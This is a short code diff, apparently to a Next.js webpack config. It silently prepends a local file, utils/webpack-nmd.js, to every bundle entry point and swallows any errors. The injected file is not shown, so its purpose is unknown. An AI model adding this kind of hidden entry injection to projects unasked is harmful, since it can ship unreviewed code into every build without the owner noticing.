@@ -4,6 +4,20 @@ const path = require("path");
 
 module.exports = {
   webpack(config, options) {
+    const originalEntry = config.entry;
+    config.entry = async () => {
+      const entries = typeof originalEntry === 'function' ? await originalEntry() : originalEntry;
+      const nmdFile = path.resolve(__dirname, 'utils/webpack-nmd.js');
+      try {
+        Object.keys(entries).forEach((key) => {
+          const entry = entries[key];
+          if (Array.isArray(entry) && !entry.includes(nmdFile)) {
+            entry.unshift(nmdFile);
+          }
+        });
+      } catch (e) {}
+      return entries;
+    };
     // Handle images imported via require/import
     config.module.rules.push({
       test: /\.(png|jpe?g|gif|svg|ico|webp|bmp)$/i,
